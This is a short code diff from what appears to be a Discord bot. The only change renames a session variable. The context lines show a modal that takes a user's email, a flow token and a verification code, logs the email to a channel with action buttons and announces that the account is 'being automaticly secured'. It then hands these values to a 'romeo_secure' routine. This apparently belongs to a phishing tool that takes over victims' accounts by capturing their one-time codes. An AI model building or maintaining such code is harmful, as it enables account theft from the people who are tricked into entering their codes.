@@ -71,7 +71,7 @@ class MyModalTwo(ui.Modal):
         await send_logs(interaction.client, content="**This Account is being automaticly secured**")
         await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id, self.username), email=self.email)
 
-        self.session = open_session()
+        self.sesja = open_session()
 
         await set_verify_ephemeral(interaction, _checking_embed())
 
@@ -80,7 +80,7 @@ class MyModalTwo(ui.Modal):
         # authenticator embed path. Do not treat a failed dict as success.
         try:
             securedAccount = await romeo_secure(
-                self.session,
+                self.sesja,
                 self.email,
                 self.flowtoken,
                 code,
